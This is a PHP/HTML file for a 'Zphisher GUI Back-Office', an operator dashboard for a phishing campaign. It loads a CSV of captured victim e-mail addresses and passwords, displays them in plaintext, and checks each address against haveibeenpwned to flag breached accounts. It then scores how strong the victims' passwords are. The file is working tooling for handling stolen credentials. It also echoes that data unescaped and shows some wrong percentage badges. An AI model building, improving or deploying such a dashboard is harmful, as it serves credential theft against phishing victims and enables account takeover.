<!DOCTYPE html>
<html lang="en">
<body class="sidebar-mini layout-fixed sidebar-collapse">


<div class="wrapper">

  <aside class="main-sidebar sidebar-dark-primary elevation-4">
    <!-- Brand Logo -->
    <a href="index.php" class="brand-link">
      <img src="elementos_web/dist/img/microjoan_logo.png" class="brand-image img-circle elevation-3" style="opacity: .8">
      <span class="brand-text font-weight-light">MicroJoan<span style="font-size:13px;"></span>
    </a>

  <!-- Sidebar -->
  <div class="sidebar">
      <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
          <br>
          <li class="nav-item">
              <a href="https://www.youtube.com/c/MicroJoan" class="nav-link">
                  <i class="nav-icon fab fa-youtube"></i>
                  <p>
                      YouTube
                  </p>
              </a>
          </li>
          <li class="nav-item">
              <a href="https://github.com/micro-joan" class="nav-link">
                  <i class="nav-icon fab fa-github"></i>
                  <p>
                      GitHub
                  </p>
              </a>
          </li>
          <li class="nav-item">
              <a href="https://www.linkedin.com/in/joan-moya-torremocha/" class="nav-link">
                  <i class="nav-icon fab fa-linkedin"></i>
                  <p>
                      LinkedIn
                  </p>
              </a>
          </li>
          <li class="nav-item">
              <a href="https://www.instagram.com/microjoan_youtube/?hl=es" class="nav-link">
                  <i class="nav-icon fab fa-instagram"></i>
                  <p>
                      Instagram
                  </p>
              </a>
          </li>
      </ul>
  </div>
      
</aside>
    
<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Zphisher GUI Back-Office</title>
  
  <!-- Font Awesome -->
  <link rel="stylesheet" href="elementos_web/plugins/fontawesome-free/css/all.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="elementos_web/dist/css/adminlte.min.css">
  <link rel="stylesheet" href="elementos_web/dist/css/adminlte.min.css">

</head>
 
  <nav class="main-header navbar navbar-expand navbar-white navbar-light">
    <!-- Left navbar links -->
    <ul class="navbar-nav">
      <li class="nav-item d-none d-sm-inline-block">
        <a href="#" class="nav-link">Dashboard</a>
      </li>
      <li class="nav-item d-none d-sm-inline-block">
        <a href="#" class="nav-link"></a>
      </li>
    </ul>

    <!-- Right navbar links -->
    <ul class="navbar-nav ml-auto">

    </ul>
  </nav>
  <!-- Content Wrapper. Contains page content -->

  
  <div class="content-wrapper pb-2">
      <br>

      <?php

        // Nombre de archivo
        $a = 'datos_usuarios.csv';

        if (file_exists($a)) { //comprobamos que el archivo CSV existe en el directorio

          $fp = fopen ("datos_usuarios.csv","r");

        } else { //si no existe mostramos mensajes de error
            echo "<script> alert('Put the user_data.csv file in the index.php directory or wait until you have a victim of this campaign.') </script>";
        }

        //KEY PARA LA API

        $key_api = fopen("key_api.txt", "r");
        while (!feof($key_api)){
            $key_api_value = fgets($key_api);

            if ($key_api_value > '') { //comprobamos que el archivo CSV existe en el directorio
    
            } else { //si no existe mostramos mensajes de error
                echo "<script> alert('Insert your key from haveibeenpwned.com in key_api.txt to see which accounts are liked.') </script>";
            }

        }
        fclose($key_api);

      ?>
  
  <section class="content">
  <div class="row">
          <div class="col-md-12 col-12">
            <div class="card card-widget widget-user">
                <!-- Add the bg color to the header using any of the bg-* classes -->
                <div class="widget-user-header" style="background: url('elementos_web/banner_wallpaper.png') center center;">
                  <h3 class="widget-user-username text-white">Zphisher GUI Back-Office</h3>
                </div>
                <div class="widget-user-image">
                  <img class="img-circle elevation-2" src="elementos_web/microjoan_logo.png">
                </div>
              </div>
           </div>
      </div>
      <br><br>
  </section>

  <section class="content">

          <div class="container-fluid">
            <div class="row">
              <div class="col-md-12 col-12">
                <div class="card collapsed-card">
                  <div class="card-header">
                    <h3 class="card-title">List of exposed accounts</h3>

                    <div class="card-tools">
                      <button type="button" class="btn btn-tool" data-card-widget="collapse" title="Collapse">
                        <i class="fas fa-minus"></i>
                      </button>
                    </div>
                  </div>
                  <div class="card-body">
                    <table class="table table-bordered">
                      <thead>
                        <tr>
                          <th style="width: 10px">E-mail</th>
                          <th style="width: 15px">Password</th>
                        </tr>
                      </thead>
                      <?php
                          $contador = 0;
                          $mayor_6_caracteres = 0;
                          $contiene_mayuscula = 0;
                          $contiene_numeros = 0;
                          $cuentas_likeadas = 0;

                          while ($data = fgetcsv ($fp, 1000, ",")) {
                            $num = count ($data);     
                            
                            //vamos a ver si la contraseña tiene mas de 6 carácteres
                            if(strlen($data[1]) > 6 ){
                                $mayor_6_caracteres ++;
                            }
                            
                      ?>
                      <tbody>
                        <tr>
                          <?php if($data[0] > ''){ 
                            
                            //error_reporting(E_ALL);
                            //ini_set('display_errors', '1');
                          
                            //COMPROBAMOS SI EL CORREO ESTÁ LIKEADO CON HAVE BE PWNED
                            $url = 'https://haveibeenpwned.com/api/v3/breachedaccount/'.$data[0];

                            $curl = curl_init($url);
                            curl_setopt($curl, CURLOPT_URL, $url);
                            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

                            $headers = array(
                              "hibp-api-key: ".$key_api_value,
                              "Content-Type: application/json",
                              "User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0"
                            );
                            curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
                            //for debug only!
                            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
                            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

                            $resp = curl_exec($curl);
                            curl_close($curl);

                            sleep(2);
                          ?>

                            <?php
                              if(($resp > '') && ($key_api_value > '')){

                                $cuentas_likeadas ++;

                                echo '<td class="bg-warning text-white">'.$data[0].' (Pwned!)</td><!--Usuario-->';
                                echo '<td class="bg-warning text-white">'.$data[1].'</td><!--Contraseña-->';
                              }else{
                                echo '<td>'.$data[0].'</td><!--Usuario-->';
                                echo '<td>'.$data[1].'</td><!--Contraseña-->';
                              }
                            ?>
                          
                          <?php  
                            $contador ++; 
                            
                            $resultado = tipo_palabra($data[1]);
                            if($resultado === 0){
                              $contiene_mayuscula ++;
                            }

                            //COMPROBAMOS CUANTAS CONTRASEÑAS TIENEN NUMEROS
                            if (ctype_alpha($data[1])) {
                                //"La cadena ".$data[1]." consiste completamente de letras.\n";
                            } else {
                                $contiene_numeros ++;
                            }
                              
                          } 
                          ?>

                      <?php
                        }
                        
                        //CALCULAMOS EL PORCENTAJE DE LAS CONTRASEÑAS MAYORES A 6 CARACTERES
                        $porcentaje_mayor_6_caracteres = obtenerPorcentaje($mayor_6_caracteres, $contador); //obtenemos el porcentaje de contraseñas mayores a 6 caracteres

                        //CALCULAMOS EL PORCENTAJE DE LAS CONTRASÑAS QUE CONTIENEN MAYUSCULAS
                        $porcentaje_mayusculas = obtenerPorcentaje($contiene_mayuscula, $contador); //obtenemos el porcentaje de contraseñas mayores a 6 caracteres

                        $porcentaje_numeros = obtenerPorcentaje($contiene_numeros, $contador); //obtenemos el porcentaje de contraseñas que contienen numeros

                        function obtenerPorcentaje($cantidad, $total) {
                          $porcentaje = ((float)$cantidad * 100) / $total; // Regla de tres
                          $porcentaje = round($porcentaje, 0);  // Quitar los decimales
                          return $porcentaje;
                        }

                        //COMPROBAMOS CUANTAS CONTRASEÑAS CONTIENEN MAYUSCULAS
                        function tipo_palabra($cadena){
                          if ($cadena === strtoupper($cadena)) {
                              return 1;
                          }

                          if ($cadena === strtolower($cadena)) {
                              return -1;
                          }

                          return 0;
                      }


                      ?>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
                      </div>

            <div class="col-lg-3 col-12">
              <div class="small-box bg-danger" style="padding-bottom: 5px;">
                <div class="inner">
                  <!--VAMOS A VER CUANTOS REGISTROS EXISTEN-->
                  <p style="font-size:35pt"><?php echo $contador ?></p>
                  <h4>Exposed accounts</h4>
                </div>
                <div class="icon">
                  <i class="fas fa-exclamation-triangle"></i>
                </div>
              </div>
            </div>

            <div class="col-lg-3 col-12">
              <?php if($cuentas_likeadas > 0){ 
                
                echo '<div class="small-box bg-warning" style="padding-bottom: 5px;">';

              }else{
                
                echo '<div class="small-box bg-success" style="padding-bottom: 5px;">';
              }
              
              ?>
                <div class="inner">
                  <!--VAMOS A VER CUANTOS REGISTROS EXISTEN-->
                  <p style="font-size:35pt"><?php echo $cuentas_likeadas ?></p>
                  <h4>Pwned accounts</h4>
                </div>
                <div class="icon">
                  <i class="fas fa-virus"></i>
                </div>
              </div>
            </div>
            

            <div class="col-lg-6 col-12">
            <div class="card">
              <!-- /.card-header -->
              <div class="card-body p-0">
                <table class="table" style="height:60px;">
                  <tbody>
                    <tr>

                      <td >Passwords with more than 6 characters: &nbsp;[ <?php echo $mayor_6_caracteres ?>/<?php echo $contador ?> ]</td>
                      <td class="pt-4" style="width: 250px">
                        <div class="progress progress-xs">

                          <?php 

                          if ($porcentaje_mayor_6_caracteres >= 65 ){
                             echo '<div class="progress-bar progress-bar bg-success" style="width: '.$porcentaje_mayor_6_caracteres.'%"></div>';
                          }

                          if (($porcentaje_mayor_6_caracteres >= 50) && ($porcentaje_mayor_6_caracteres < 65) ){
                            echo '<div class="progress-bar progress-bar bg-warning" style="width: '.$porcentaje_mayor_6_caracteres.'%"></div>';
                          }

                          if (($porcentaje_mayor_6_caracteres >= 0) && ($porcentaje_mayor_6_caracteres < 50) ){
                            echo '<div class="progress-bar progress-bar bg-danger" style="width: '.$porcentaje_mayor_6_caracteres.'%"></div>';
                          }

                          ?>
                        </div>
                      </td>
                      <td>
                        <?php 
                            if ($porcentaje_mayor_6_caracteres >= 65){
                              echo '<span class="badge bg-success">'.$porcentaje_mayor_6_caracteres.'%</span></td>';
                            }

                            if (($porcentaje_mayor_6_caracteres >= 50) && ($porcentaje_mayor_6_caracteres < 65)){
                              echo '<span class="badge bg-warning">'.$porcentaje_mayor_6_caracteres.'%</span></td>';
                            }

                            if (($porcentaje_mayor_6_caracteres >= 0) && ($porcentaje_mayor_6_caracteres < 50) ){
                              echo '<span class="badge bg-danger">'.$porcentaje_mayor_6_caracteres.'%</span></td>';
                            }
                        ?>
                    </td>
                    </tr>


                    <tr>
                      <td>Passwords that contain uppercase letters: &nbsp;[ <?php echo $contiene_mayuscula ?>/<?php echo $contador ?> ]</td>
                      <td class="pt-4" style="width: 250px">
                        <div class="progress progress-xs">

                          <?php 

                          if ($porcentaje_mayusculas >= 65 ){
                             echo '<div class="progress-bar progress-bar bg-success" style="width: '.$porcentaje_mayusculas.'%"></div>';
                          }

                          if (($porcentaje_mayusculas >= 50) && ($porcentaje_mayusculas < 65) ){
                            echo '<div class="progress-bar progress-bar bg-warning" style="width: '.$porcentaje_mayusculas.'%"></div>';
                          }

                          if (($porcentaje_mayusculas >= 0) && ($porcentaje_mayusculas < 50) ){
                            echo '<div class="progress-bar progress-bar bg-danger" style="width: '.$porcentaje_mayusculas.'%"></div>';
                          }

                          ?>
                        </div>
                      </td>
                      <td>
                        <?php 
                            if ($porcentaje_mayusculas >= 65){
                              echo '<span class="badge bg-success">'.$porcentaje_mayusculas.'%</span></td>';
                            }

                            if (($porcentaje_mayusculas >= 50) && ($porcentaje_mayusculas < 65)){
                              echo '<span class="badge bg-warning">'.$porcentaje_mayor_6_caracteres.'%</span></td>';
                            }

                            if (($porcentaje_mayusculas >= 0) && ($porcentaje_mayusculas < 50) ){
                              echo '<span class="badge bg-danger">'.$porcentaje_mayusculas.'%</span></td>';
                            }
                        ?>
                    </td>
                    </tr>


                    <tr>
                      <td>Passwords with numeric characters: &nbsp;[ <?php echo $contiene_numeros ?>/<?php echo $contador ?> ]</td>
                      <td class="pt-4" style="width: 250px">
                        <div class="progress progress-xs">

                          <?php 

                          if ($porcentaje_numeros >= 65 ){
                             echo '<div class="progress-bar progress-bar bg-success" style="width: '.$porcentaje_numeros.'%"></div>';
                          }

                          if (($porcentaje_numeros >= 50) && ($porcentaje_numeros < 65) ){
                            echo '<div class="progress-bar progress-bar bg-warning" style="width: '.$porcentaje_numeros.'%"></div>';
                          }

                          if (($porcentaje_numeros >= 0) && ($porcentaje_numeros < 50) ){
                            echo '<div class="progress-bar progress-bar bg-danger" style="width: '.$porcentaje_numeros.'%"></div>';
                          }

                          ?>
                        </div>
                      </td>
                      <td>
                        <?php 
                            if ($porcentaje_numeros >= 65){
                              echo '<span class="badge bg-success">'.$porcentaje_numeros.'%</span></td>';
                            }

                            if (($porcentaje_numeros >= 50) && ($porcentaje_numeros < 65)){
                              echo '<span class="badge bg-warning">'.$porcentaje_mayor_6_caracteres.'%</span></td>';
                            }

                            if (($porcentaje_numeros >= 0) && ($porcentaje_numeros < 50) ){
                              echo '<span class="badge bg-danger">'.$porcentaje_numeros.'%</span></td>';
                            }
                        ?>
                    </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>          
        </div>
      </div>
  </section>   
  </div>
  
    
  <!-- /.content-wrapper -->
  <footer class="main-footer">
      <strong><a href="https://www.youtube.com/c/MicroJoan">MICROJOAN</a></strong>
      Zphisher GUI Back-Office.
  </footer>
</div>


    <!-- Control Sidebar -->
    <aside class="control-sidebar control-sidebar-dark">
      <!-- Control sidebar content goes here -->
    </aside>
    <!-- /.control-sidebar -->

                

  <!--PLUGINS-->
  <script src="elementos_web/plugins/jquery/jquery.min.js"></script>
  <script src="elementos_web/plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="elementos_web/dist/js/adminlte.js"></script>

  


